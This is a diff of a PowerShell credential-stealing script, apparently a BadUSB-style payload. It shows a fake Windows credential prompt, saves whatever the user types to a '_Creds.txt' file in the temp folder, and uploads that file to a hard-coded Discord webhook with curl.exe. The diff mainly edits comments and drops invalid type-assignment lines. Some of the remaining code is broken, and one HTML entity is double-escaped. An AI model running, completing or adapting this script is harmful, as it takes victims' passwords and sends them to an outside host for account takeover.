@@ -6,15 +6,11 @@ $dc = "https://discord.com/api/webhooks/1555582537982546041/GTSJgDiEC3p6LGeaveS4
 $env:username = "TargetUsername" # Username
 
 # ============================================================================
-# ASSEMBY &amp; UTILITIES - FORCING THE UI STACK
+# ASSEMBY &amp; UTILITIES
 # ============================================================================
 
-# Load primary dependencies first. These are the fundamental containers.
+# Load the core library that contains the UI types
 Add-Type -AssemblyName System.Windows.Forms
-
-# Define the classes explicitly if the shortcut assembly fails
-[System.Windows.MessageBoxButtons] = [System.Collections.Hashtable]::AsPublicPropertyType([System.Windows.MessageBoxButtons]::GetMembers())
-[System.Windows.MessageBoxImage] = [System.Collections.Hashtable]::AsPublicPropertyType([System.Windows.MessageBoxImage]::GetMembers())
 
 # Function to handle mandatory confirmation if the loop triggers manually
 function Show-ErrorAlert {
@@ -22,7 +18,7 @@ function Show-ErrorAlert {
         [string]$Title = "Error",
         [string]$Message = "Operation Failed."
     )
-    # FORCEFULLY use the fully qualified names:
+    # Use fully qualified type names directly, bypassing the complex assignments
     [System.Windows.MessageBox]::Show($Message, $Title, [System.Windows.MessageBoxButtons]::OK, [System.Windows.MessageBoxImage]::Stop)
 }
 
@@ -36,13 +32,13 @@ function Get-Creds {
 
         # 1. Primary Attempt: Use the system's built-in prompt (most reliable fallback)
         try {
+            # Note: Ensure $host.ui is defined if running in a non-standard console
             $cred = Get-Credential -UserName ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name); 
         }
         catch {
-            # If Get-Credential fails, try host.ui as a backup
+            # Fallback attempt
             Write-Warning "Get-Credential failed. Attempting host.ui..."
             try {
-                 # NOTE: Assuming $host.ui is defined in your execution context
                  $cred = $host.ui.promptforcredential('Fallback Prompt','Please enter credentials.','Fallback','Fallback');
             } catch {
                 Write-Error "All prompt mechanisms failed. Aborting."
@@ -52,7 +48,7 @@ function Get-Creds {
 
         # 2. Validation Check
         if (-not ($cred -and -not [string]::IsNullOrWhiteSpace($cred.Password))) {
-            # --- THIS IS THE TARGET POPUP ---
+            # --- TARGET POPUP ---
             $msgBody = "Credentials are empty. Please try again."
             # Triggering the error alert directly
             Show-ErrorAlert -Title "Input Required" -Message $msgBody
@@ -92,7 +88,6 @@ function Upload-Discord {
     if (-not [string]::IsNullOrWhiteSpace($file) -and (Test-Path $file)) {
         try {
             Write-Host "[INFO] Uploading file to Discord..."
-            # Using curl.exe for file upload consistency
             curl.exe -F "file1=@$file" $hookurl
             Write-Host "[SUCCESS] File uploaded to Discord."
         }
@@ -112,7 +107,7 @@ try {
     # --- CORE INTERACTION ---
     $creds = Get-Creds
 
-    # --- FILE &amp; UPLOAD ---
+    # --- FILE &amp;amp; UPLOAD ---
     $FileName = "$env:USERNAME-$(Get-Date -Format yyyy-MM-dd_HH-mm)_Creds.txt"
     $tempPath = Join-Path $env:TEMP $FileName
 
